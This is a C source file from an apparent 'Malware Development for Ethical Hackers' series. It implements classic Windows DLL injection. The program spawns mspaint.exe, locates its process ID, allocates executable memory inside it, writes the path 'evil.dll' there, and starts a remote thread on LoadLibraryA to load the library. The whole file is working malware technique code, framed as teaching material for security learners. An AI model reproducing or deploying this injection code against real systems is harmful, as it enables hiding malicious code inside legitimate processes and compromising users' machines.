/*
 * Malware Development for Ethical Hackers
 * hack.c
 * example of classic DLL injection
 * author: @cocomelonc
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll")

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
  HANDLE             ProcessHandle,
  PVOID              *BaseAddress,
  ULONG              ZeroBits,
  PULONG             RegionSize,
  ULONG              AllocationType,
  ULONG              Protect
);

char maliciousLibraryPath[] = "evil.dll";
unsigned int maliciousLibraryPathLength = sizeof(maliciousLibraryPath) + 1;

int findProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

int main(int argc, char* argv[]) {
  HANDLE targetProcess; // Target process handle
  HANDLE remoteThread;  // Remote thread
  LPVOID remoteBuffer;  // Remote buffer for data

  // Obtain handles to kernel32 and ntdll and retrieve function pointer
  HMODULE kernel32Handle = GetModuleHandle("Kernel32");
  HMODULE ntdllHandle = GetModuleHandle("ntdll");
  VOID *loadLibraryFunction = (VOID *)GetProcAddress(kernel32Handle, "LoadLibraryA");

  STARTUPINFOA si;
  PROCESS_INFORMATION pi;
  ZeroMemory(&si, sizeof(STARTUPINFOA));
  si.cb = sizeof(STARTUPINFOA);
  const char* process = "mspaint.exe";
  CreateProcessA(NULL, (LPSTR)process,
  NULL, NULL, FALSE, 0, NULL, NULL, &si,&pi);
  int pid = -1;
  pid = findProc(process);

  // Parse process ID
  if (pid <= 0) {
    printf("Process ID not found. Exiting...\n");
    return -1;
  }

  printf("Process ID: %i", pid);
  targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

  pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdllHandle, "NtAllocateVirtualMemory");  

  // Allocate memory buffer in the remote process
  myNtAllocateVirtualMemory(targetProcess, &remoteBuffer, 0, (PULONG)&maliciousLibraryPathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  // Copy the malicious DLL path to the remote process
  WriteProcessMemory(targetProcess, remoteBuffer, maliciousLibraryPath, maliciousLibraryPathLength, NULL);

  // Start a new thread in the target process
  remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryFunction, remoteBuffer, 0, NULL);
  CloseHandle(targetProcess);
  return 0;
}
